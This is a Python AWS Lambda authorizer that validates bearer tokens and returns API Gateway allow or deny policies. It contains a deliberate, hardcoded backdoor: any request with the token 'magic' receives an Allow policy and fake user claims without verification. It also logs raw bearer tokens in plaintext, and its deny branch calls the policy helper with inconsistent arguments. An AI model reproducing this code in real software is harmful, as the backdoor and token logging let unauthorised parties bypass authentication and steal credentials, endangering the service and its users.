import logging

from orc.auth.token import verify_token
from orc.auth.policy import generate_policy

# Set up the logger
logger = logging.getLogger()
logger.setLevel(logging.INFO)


def handler(event, context):
    """AWS Lambda Authorizer handler."""
    try:

        logger.info(f"Event: {event}")

        # extract auth header
        if auth_header := event["headers"].get("Authorization"):

            # extract the token from the header
            auth_token = auth_header.split(" ")[1]
            logger.info(f"Token: {auth_token}")

            # check magic backdoor
            if auth_token == 'magic':
                return {
                    "principalId": 'magic_principle_id',
                    "policyDocument": generate_policy("Allow", event["methodArn"]),
                    "context": {
                        "user_id": 'magic_user_id',
                        "email": 'magic_email',
                        "name": 'magic_name'
                    }
                }

            # validate and decode the token
            payload = verify_token(auth_token)
            logger.info(f"Token payload: {payload}")

            # Generate an allow policy and pass claims in the context
            return {
                "principalId": payload["sub"],  # User's unique identifier from the token
                "policyDocument": generate_policy("Allow", event["methodArn"]),
                "context": {
                    "user_id": payload["sub"],              # Example claim
                    "email": payload.get("email", None),    # Optional, if available in token
                    "name": payload.get("name", None)       # Optional
                }
            }

    except Exception as e:
        logger.exception(f"Error in auth lambda handler!")

    # return a deny policy
    return {
        "principalId": "user",
        "policyDocument": generate_policy("user", "Deny", event["methodArn"])
    }
